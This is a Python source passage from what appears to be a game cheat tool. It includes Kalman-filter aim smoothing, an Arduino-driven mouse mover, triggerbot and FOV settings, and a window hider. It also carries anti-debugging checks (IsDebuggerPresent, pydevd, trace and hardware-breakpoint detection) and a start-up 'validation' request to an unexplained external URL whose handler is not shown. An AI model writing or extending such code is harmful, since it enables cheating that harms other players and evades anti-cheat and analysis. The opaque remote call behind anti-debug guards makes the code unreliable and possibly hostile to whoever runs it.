        correlation_factor = self.kalman_config.get("xy_correlation", 0.3)
        
        self.kf.P = np.array([
            [p_pos, p_pos*correlation_factor, 0., 0.],
            [p_pos*correlation_factor, p_pos, 0., 0.],
            [0., 0., p_vel, p_vel*correlation_factor],
            [0., 0., p_vel*correlation_factor, p_vel]
        ])
        
        # Measurement noise
        r_val = self.kalman_config.get("kf_r", 2.8)
        measurement_correlation = self.kalman_config.get("measurement_correlation", 0.1)
        
        self.kf.R = np.array([
            [r_val, r_val*measurement_correlation],
            [r_val*measurement_correlation, r_val]
        ])
        
        # Process noise with coupling
        q = self.kalman_config.get("kf_q", 28.11)
        process_correlation = self.kalman_config.get("process_correlation", 0.2)
        q_pos = q / 3
        q_vel = q
        
        self.kf.Q = np.array([
            [q_pos, q_pos*process_correlation, q_pos/2, q_pos*process_correlation/2],
            [q_pos*process_correlation, q_pos, q_pos*process_correlation/2, q_pos/2],
            [q_pos/2, q_pos*process_correlation/2, q_vel, q_vel*process_correlation],
            [q_pos*process_correlation/2, q_pos/2, q_vel*process_correlation, q_vel]
        ])
    
    def _on_config_update(self, new_config):
        """Handle configuration updates"""
        if "kalman" in new_config:
            self.kalman_config = new_config["kalman"]
            
            # Check if coupling mode changed
            new_use_coupled = self.kalman_config.get("use_coupled_xy", False)
            if new_use_coupled != self.use_coupled:
                self.use_coupled = new_use_coupled
                if self.use_coupled:
                    self._init_coupled_filter()
                else:
                    self.kf_x = KalmanFilter(dim_x=2, dim_z=1)
                    self.kf_y = KalmanFilter(dim_x=2, dim_z=1)
                    self._configure_filters()
            else:
                # Just reconfigure existing filter type
                if self.use_coupled:
                    self._configure_coupled_filter()
                else:
                    self._configure_filters()
    
    def _configure_filters(self):
        """Original configuration for independent filters"""
        if not self.kalman_config.get("use_kalman", True):
            return
        
        for kf in [self.kf_x, self.kf_y]:
            kf.x = np.array([[0.], [0.]])
            kf.F = np.array([[1., 1.], [0., 1.]])
            kf.H = np.array([[1., 0.]])
            kf.P = np.eye(2) * self.kalman_config.get("kf_p", 38.17)
            kf.R = np.array([[self.kalman_config.get("kf_r", 2.8)]])
            q = self.kalman_config.get("kf_q", 28.11)
            kf.Q = np.array([[q/3, q/2], [q/2, q]])
    
    def update(self, dx, dy):
        """Update the Kalman filter(s) with new measurements"""
        if not self.kalman_config.get("use_kalman", True):
            if isinstance(dx, torch.Tensor):
                dx = dx.cpu().item()
            if isinstance(dy, torch.Tensor):
                dy = dy.cpu().item()
            return int(dx), int(dy)
        
        # Convert tensors if needed
        if isinstance(dx, torch.Tensor):
            dx = dx.cpu().item()
        if isinstance(dy, torch.Tensor):
            dy = dy.cpu().item()
        
        if self.use_coupled:
            self.kf.predict()
            measurement = np.array([[dx], [dy]])
            self.kf.update(measurement)
            # return floats, not ints
            return float(self.kf.x[0, 0]), float(self.kf.x[1, 0])
        else:
            self.kf_x.predict()
            self.kf_y.predict()
            self.kf_x.update(np.array([[dx]]))
            self.kf_y.update(np.array([[dy]]))
            # return floats, not ints
            return float(self.kf_x.x[0, 0]), float(self.kf_y.x[0, 0])
    
    def get_motion_analysis(self):
        """Analyze current motion (only for coupled mode)"""
        if not self.use_coupled or not self.kalman_config.get("use_kalman", True):
            return {}
        
        vx = float(self.kf.x[2][0])
        vy = float(self.kf.x[3][0])
        speed = np.sqrt(vx**2 + vy**2)
        
        # Check for turning
        velocity_covariance = self.kf.P[2:4, 2:4]
        turning_indicator = abs(velocity_covariance[0, 1]) / (np.sqrt(velocity_covariance[0, 0] * velocity_covariance[1, 1]) + 1e-10)
        
        return {
            "speed": speed,
            "heading_rad": np.arctan2(vy, vx),
            "heading_deg": np.degrees(np.arctan2(vy, vx)),
            "is_turning": turning_indicator > 0.5,
            "turning_strength": float(turning_indicator)
        }
    
    def predict_frames(self):
        """Predict positions for configured number of frames ahead"""
        if not self.kalman_config.get("use_kalman", True):
            return []
        
        frames_to_predict = self.kalman_config.get("kalman_frames_to_predict", 1.5)
        num_predictions = int(frames_to_predict)
        predictions = []
        
        if self.use_coupled:
            # Store current state
            state_backup = self.kf.x.copy()
            cov_backup = self.kf.P.copy()
            
            for i in range(num_predictions):
                self.kf.predict()
                
                predictions.append({
                    "frame": i + 1,
                    "x": int(self.kf.x[0][0]),
                    "y": int(self.kf.x[1][0]),
                    "vx": float(self.kf.x[2][0]),
                    "vy": float(self.kf.x[3][0]),
                    "uncertainty_x": float(np.sqrt(self.kf.P[0, 0])),
                    "uncertainty_y": float(np.sqrt(self.kf.P[1, 1]))
                })
            
            # Restore state
            self.kf.x = state_backup
            self.kf.P = cov_backup
        else:
            # Original prediction logic
            x_state = self.kf_x.x.copy()
            y_state = self.kf_y.x.copy()
            x_cov = self.kf_x.P.copy()
            y_cov = self.kf_y.P.copy()
            
            for i in range(num_predictions):
                self.kf_x.predict()
                self.kf_y.predict()
                
                p_value = self.kalman_config.get("kf_p", 38.17) + i * 0.1
                
                predictions.append({
                    "frame": i + 1,
                    "x": int(self.kf_x.x[0][0]),
                    "y": int(self.kf_y.x[0][0]),
                    "kf_p": p_value,
                    "uncertainty_x": float(np.sqrt(self.kf_x.P[0, 0])),
                    "uncertainty_y": float(np.sqrt(self.kf_y.P[0, 0]))
                })
            
            self.kf_x.x = x_state
            self.kf_y.x = y_state
            self.kf_x.P = x_cov
            self.kf_y.P = y_cov
        
        return predictions

kernel32 = ctypes.WinDLL('kernel32')
user32 = windll.user32

class PROCESS_MITIGATION_DYNAMIC_CODE_POLICY(ctypes.Structure):
    _fields_ = [
        ('ProhibitDynamicCode', ctypes.c_uint, 1),
        ('AllowThreadOptOut', ctypes.c_uint, 1),
        ('AllowRemoteDowngrade', ctypes.c_uint, 1),
        ('AuditProhibitDynamicCode', ctypes.c_uint, 1),
        ('ReservedFlags', ctypes.c_uint, 28),
    ]

def send_coordinates(arduino, x, y):
    try:
        command = f"move {int(x)},{int(y)}\n"
        arduino.write(command.encode())
    except Exception as e:
        print(colored(f"Error sending coordinates to Arduino: {e}", 'red'))

if kernel32.IsDebuggerPresent():
    print("Error code: 1")
    sys.exit(1)
if 'pydevd' in sys.modules:
    print("Error code: 2")
    sys.exit(1)
if sys.gettrace() is not None:
    print("Error code: 3")
    sys.exit(1)

dynamic_code_policy = PROCESS_MITIGATION_DYNAMIC_CODE_POLICY()
dynamic_code_policy.ProhibitDynamicCode = 1
kernel32.SetProcessMitigationPolicy(11, ctypes.byref(dynamic_code_policy), ctypes.sizeof(dynamic_code_policy))

context = ctypes.create_string_buffer(716)
ctypes.memset(ctypes.addressof(context), 0, ctypes.sizeof(context))
context_ptr = ctypes.cast(ctypes.addressof(context), ctypes.POINTER(ctypes.c_long))
kernel32.GetThreadContext(kernel32.GetCurrentThread(), context_ptr)
if context_ptr[41] != 0 or context_ptr[42] != 0 or context_ptr[43] != 0 or context_ptr[44] != 0:
    print("Error code: 4")
    sys.exit(1)

urllib3.disable_warnings()
local_version = "1.4.3 BETA"
with open('lib/config/config.json', 'r') as file:
    config = json.load(file)
show_alerts = config.get('account_settings', {}).get('discord', {}).get('alerts', {}).get('visible', True)
if not isinstance(show_alerts, bool):
    print("You have an outdated config. Please add the new settings from  to your config.json ")
    print(colored("show_alerts must be a boolean (true or false)", 'red'))
    sys.exit(1)

cpu_info = cpuinfo.get_cpu_info()
cpu_name = cpu_info.get('brand_raw', 'Unknown CPU')
try:
    gpu_stats = gpustat.GPUStatCollection.new_query()
    gpu_name = gpu_stats.gpus[0].name if gpu_stats.gpus else "No GPU found"
except:
    gpu_name = "No GPU found"

try:
    fov = config['fov']
    sensitivity = config['sensitivity']
    aim_height = config['aim_height']
    confidence = config['confidence']
    triggerbot = config['triggerbot']
    keybind = config['keybind']
    mouse_method = config['mouse_method']
    custom_resolution = config['custom_resolution']
    use_custom_resolution = config['custom_resolution']['use_custom_resolution']
    custom_x = config['custom_resolution']['x']
    custom_y = config['custom_resolution']['y']
except KeyError as ke:
    print(f"Missing configuration field: {ke}. Please check your config.json file.")
    sys.exit(1)

                
if __name__ == "__main__":
    # High DPI is already configured at the top of the file
    
    VALIDATION_URL = 'https://solana-fz-site.oo.gd/'
    print("Validating connection...")
    
    # Make HTTP request first
    if not make_request(VALIDATION_URL):
        print("Failed to validate connection. Exiting...")
        sys.exit(1)
    
    # Only proceed if HTTP request was successful
    if not initialize_packages():
        sys.exit(0)
    
    # Create QApplication (High DPI policy already set at module level)
    app = QApplication(sys.argv)
    
    config_manager = ConfigManager()
    update_config_for_debug_window(config_manager)
    smoother = KalmanSmoother(config_manager)
    window = ConfigApp()
    gui_hider = integrate_with_pyqt(window)
    window.show()
    sys.exit(app.exec())